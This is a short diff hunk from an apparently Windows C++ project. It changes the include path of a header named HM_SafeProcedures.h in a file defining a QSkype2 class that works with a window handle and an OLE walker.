@@ -12,7 +12,7 @@ using namespace std;
 #include "QSkype2.h"
 #include "QOleWalker.h"
 #include "QSkype.h"
-#include "..\HM_SafeProcedures.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 
 QSkype2::QSkype2(const HWND hwnd){
 	ole.Init();
